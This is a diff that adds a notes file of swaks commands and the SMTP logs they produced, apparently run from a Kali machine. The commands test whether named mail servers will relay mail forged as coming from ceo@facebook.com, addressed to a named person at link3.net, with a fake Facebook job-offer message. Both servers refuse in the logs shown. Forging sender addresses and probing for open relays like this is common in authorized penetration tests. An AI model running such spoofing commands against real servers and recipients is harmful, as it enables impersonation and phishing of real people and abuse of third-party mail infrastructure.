@@ -62,3 +62,73 @@ swaks --to m.faizullah@link3.net --server mailx.link3.net
 
 
 
+
+
+
+
+swaks --to m.faizullah@link3.com --server ecres155.servconfig.com
+swaks --to m.faizullah@link3.com --server se2-iad1.servconfig.com	
+
+
+
+
+
+
+swaks -s ecres155.servconfig.com -f ceo@facebook.com -t m.faizullah@link3.net --header "Subject: Job Offer from Facebook" --body "Congratulation! We are pleased to appoint you as CEO replacing Zuck!"
+swaks -s se2-iad1.servconfig.com -f ceo@facebook.com -t m.faizullah@link3.net --header "Subject: Job Offer from Facebook" --body "Congratulation! We are pleased to appoint you as CEO replacing Zuck!"
+
+
+swaks -s se2-iad1.servconfig.com -f ceo@facebook.com -t m.faizullah@link3 --header "Subject: Job Offer from Facebook" --body "Congratulation! We are pleased to appoint you as CEO replacing Zuck"
+=== Trying se2-iad1.servconfig.com:25...
+=== Connected to se2-iad1.servconfig.com.
+<-  220 se2-iad1.servconfig.com ESMTP Exim 20221206.1120 Tue, 03 Jan 2023 00:46:45 -0500
+ -> EHLO kali
+<-  250-se2-iad1.servconfig.com Hello kali [203.76.99.254]
+<-  250-SIZE
+<-  250-8BITMIME
+<-  250-DSN
+<-  250-VRFY
+<-  250-STARTTLS
+<-  250 HELP
+ -> MAIL FROM:<ceo@facebook.com>
+<-  250 OK
+ -> RCPT TO:<m.faizullah@link3>
+<** 451 relay not permitted!
+ -> QUIT
+<-  221 se2-iad1.servconfig.com closing connection
+
+
+
+
+swaks -s ecres155.servconfig.com -f ceo@facebook.com -t m.faizullah@link3 --header "Subject: Job Offer from Facebook" --body "Congratulation! We are pleased to appoint you as CEO replacing Zuck"
+=== Trying ecres155.servconfig.com:25...
+=== Connected to ecres155.servconfig.com.
+<-  220-ecres155.servconfig.com ESMTP Exim 4.95 #2 Tue, 03 Jan 2023 00:46:27 -0500
+<-  220-We do not authorize the use of this system to transport unsolicited,
+<-  220 and/or bulk e-mail.
+ -> EHLO kali
+<-  250-ecres155.servconfig.com Hello kali [203.76.99.254]
+<-  250-SIZE 52428800
+<-  250-8BITMIME
+<-  250-PIPELINING
+<-  250-PIPE_CONNECT
+<-  250-AUTH PLAIN LOGIN
+<-  250-CHUNKING
+<-  250-STARTTLS
+<-  250 HELP
+ -> MAIL FROM:<ceo@facebook.com>
+<** 550 Access denied - Invalid HELO name (See RFC2821 4.1.1.1)
+ -> QUIT
+ 
+ 
+
+
+
+
+
+
+
+
+
+
+
